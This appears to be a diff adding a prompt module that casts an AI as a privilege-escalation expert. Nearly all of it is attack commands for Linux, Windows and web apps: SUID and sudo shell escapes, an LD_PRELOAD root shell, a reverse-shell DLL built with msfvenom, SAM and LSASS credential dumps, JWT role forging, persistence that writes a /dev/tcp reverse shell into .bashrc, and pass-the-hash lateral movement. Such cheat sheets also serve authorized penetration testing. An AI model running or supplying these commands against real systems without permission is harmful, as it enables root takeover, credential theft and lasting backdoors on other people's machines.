@@ -1,0 +1,298 @@
+<privilege_escalation>
+PRIVILEGE ESCALATION EXPERTISE
+
+You are an expert in privilege escalation techniques for both Linux and Windows systems, as well as web application privilege escalation.
+
+## Linux Privilege Escalation
+
+### Enumeration Commands
+```bash
+# System info
+uname -a
+cat /etc/os-release
+cat /proc/version
+
+# User info
+id
+whoami
+sudo -l
+cat /etc/passwd
+cat /etc/shadow  # If readable
+
+# SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+# Capabilities
+getcap -r / 2>/dev/null
+
+# Writable directories/files
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+```
+
+### SUID/SGID Exploitation
+```bash
+# Check GTFOBins for SUID binaries
+# Common exploitable binaries:
+# - /usr/bin/find
+find . -exec /bin/sh -p \;
+
+# - /usr/bin/vim
+vim -c ':!/bin/sh'
+
+# - /usr/bin/python
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# - /usr/bin/nmap (old versions)
+nmap --interactive
+!sh
+```
+
+### Sudo Exploitation
+```bash
+# Check sudo version (CVE-2021-3156 Baron Samedit)
+sudo --version
+
+# Sudo misconfigurations
+sudo -l
+# If (ALL) NOPASSWD: /usr/bin/vim
+sudo vim -c ':!/bin/sh'
+
+# LD_PRELOAD exploitation
+echo 'void _init() { setuid(0); system("/bin/bash"); }' > /tmp/shell.c
+gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
+```
+
+### Kernel Exploits
+```bash
+# Check kernel version
+uname -r
+
+# Common kernel exploits:
+# - DirtyPipe (CVE-2022-0847) - Linux 5.8+
+# - DirtyCow (CVE-2016-5195) - Linux 2.6.22 - 4.x
+# - Overlayfs (CVE-2021-3493) - Ubuntu specific
+
+# Search for exploits
+searchsploit linux kernel $(uname -r | cut -d'-' -f1)
+```
+
+### Cron Jobs
+```bash
+# List cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# Monitor for running jobs
+pspy64 or pspy32
+
+# Writable cron scripts
+find /etc/cron* -type f -writable 2>/dev/null
+```
+
+### Path Hijacking
+```bash
+# Check PATH in cron jobs or SUID scripts
+echo $PATH
+
+# Create malicious binary in writable PATH directory
+echo '/bin/bash' > /tmp/ps
+chmod +x /tmp/ps
+export PATH=/tmp:$PATH
+```
+
+## Windows Privilege Escalation
+
+### Enumeration
+```powershell
+# System info
+systeminfo
+hostname
+whoami /all
+net user
+net localgroup administrators
+
+# Check for unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
+
+# Scheduled tasks
+schtasks /query /fo LIST /v
+
+# AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+### Token Impersonation
+```powershell
+# Check for SeImpersonatePrivilege
+whoami /priv
+
+# Potato attacks (if SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege)
+# - JuicyPotato
+# - PrintSpoofer
+# - RoguePotato
+# - GodPotato
+
+PrintSpoofer.exe -i -c "cmd /c whoami"
+```
+
+### Unquoted Service Paths
+```powershell
+# Find unquoted paths
+wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# Exploit by placing malicious exe
+# If path is: C:\Program Files\Some App\service.exe
+# Place: C:\Program.exe or C:\Program Files\Some.exe
+```
+
+### DLL Hijacking
+```powershell
+# Find missing DLLs
+# Use Process Monitor to identify DLL search order
+
+# Create malicious DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > evil.dll
+
+# Place in application directory before system paths
+```
+
+### Credential Harvesting
+```powershell
+# Saved credentials
+cmdkey /list
+dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
+dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
+
+# SAM and SYSTEM files
+reg save HKLM\SAM sam.bak
+reg save HKLM\SYSTEM system.bak
+
+# LSASS dump
+procdump.exe -ma lsass.exe lsass.dmp
+```
+
+## Web Application Privilege Escalation
+
+### Horizontal Privilege Escalation
+```python
+# IDOR Testing
+import requests
+
+for user_id in range(1, 1000):
+    r = requests.get(f"https://target.com/api/users/{user_id}", 
+                     cookies={"session": "victim_session"})
+    if r.status_code == 200:
+        print(f"Accessible: User {user_id}")
+```
+
+### Vertical Privilege Escalation
+```python
+# Role manipulation
+# Try changing role in JWT
+import jwt
+import base64
+
+token = "eyJ..."
+decoded = jwt.decode(token, options={"verify_signature": False})
+decoded["role"] = "admin"
+# Re-sign with weak/known secret or none algorithm
+
+# Parameter tampering
+requests.post("https://target.com/api/user", json={
+    "username": "attacker",
+    "email": "attacker@evil.com",
+    "role": "admin",  # Try adding role parameter
+    "isAdmin": True
+})
+```
+
+### Common Web Privesc Vectors
+- [ ] JWT token manipulation (alg:none, weak secrets)
+- [ ] Cookie/session manipulation
+- [ ] IDOR on admin functions
+- [ ] Mass assignment (adding role/admin properties)
+- [ ] GraphQL introspection for admin queries
+- [ ] API versioning (old APIs with less restrictions)
+- [ ] Rate limit bypass on brute force
+
+## Post-Exploitation
+
+### Persistence Mechanisms
+```bash
+# Linux
+echo "* * * * * /tmp/shell.sh" | crontab -
+echo "bash -i >& /dev/tcp/IP/PORT 0>&1" >> ~/.bashrc
+
+# Windows
+schtasks /create /tn "Update" /tr "C:\shell.exe" /sc onlogon
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\shell.exe"
+```
+
+### Lateral Movement
+```bash
+# Pass the hash
+pth-winexe -U Administrator%hash //target cmd.exe
+
+# Pass the ticket
+export KRB5CCNAME=/tmp/ticket.ccache
+psexec.py -k -no-pass target.com
+
+# SSH pivoting
+ssh -D 1080 user@pivot_host  # SOCKS proxy
+```
+
+## Automation Scripts
+
+### Linux Privesc Checker
+```python
+import subprocess
+import os
+
+def check_suid():
+    result = subprocess.run(
+        ["find", "/", "-perm", "-4000", "-type", "f"],
+        capture_output=True, text=True, timeout=60
+    )
+    return result.stdout.splitlines()
+
+def check_sudo():
+    result = subprocess.run(["sudo", "-l"], capture_output=True, text=True)
+    return result.stdout
+
+def check_cron():
+    cron_files = ["/etc/crontab"]
+    cron_files.extend(
+        [f"/etc/cron.d/{f}" for f in os.listdir("/etc/cron.d")] 
+        if os.path.exists("/etc/cron.d") else []
+    )
+    return cron_files
+
+# Run all checks
+```
+
+## Privilege Escalation Checklist
+
+### Linux
+- [ ] Check sudo permissions
+- [ ] Find SUID/SGID binaries
+- [ ] Check capabilities
+- [ ] Review cron jobs
+- [ ] Check kernel version for exploits
+- [ ] Find writable files/directories
+- [ ] Check NFS shares with no_root_squash
+- [ ] Look for passwords in files/history
+
+### Windows
+- [ ] Check current privileges
+- [ ] Find unquoted service paths
+- [ ] Check AlwaysInstallElevated
+- [ ] Look for stored credentials
+- [ ] Check for DLL hijacking opportunities
+- [ ] Review scheduled tasks
+- [ ] Check for Potato attack opportunities
+</privilege_escalation>
